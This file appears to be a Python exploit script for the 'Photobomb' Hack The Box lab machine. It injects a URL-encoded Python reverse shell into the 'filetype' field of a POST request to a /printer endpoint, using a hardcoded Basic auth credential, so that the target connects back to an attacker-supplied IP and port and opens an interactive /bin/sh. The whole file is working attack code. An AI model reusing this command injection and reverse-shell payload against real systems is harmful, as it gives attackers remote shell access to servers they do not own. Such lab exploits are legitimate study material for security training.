import re
import sys
import requests

def reverse_shell(url, ip, port):
	payload = f"python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22{ip}%22%2C{port}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"
	headers = {"Authorization": "Basic cEgwdDA6YjBNYiE=", "content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}
	data = "photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;" + payload + "&dimensions=3000x2000"
	print(f"\n + Photobomb Machines HTB + \n\nr00t@ardhani:~$ {ip}\nr00t@ardhani:~$ {port}")
	r = requests.post(url, headers=headers, data=data)
	print("[+] Successfully connected!")

if __name__ == "__main__":	
	reverse_shell("http://photobomb.htb/printer", sys.argv[1], sys.argv[2])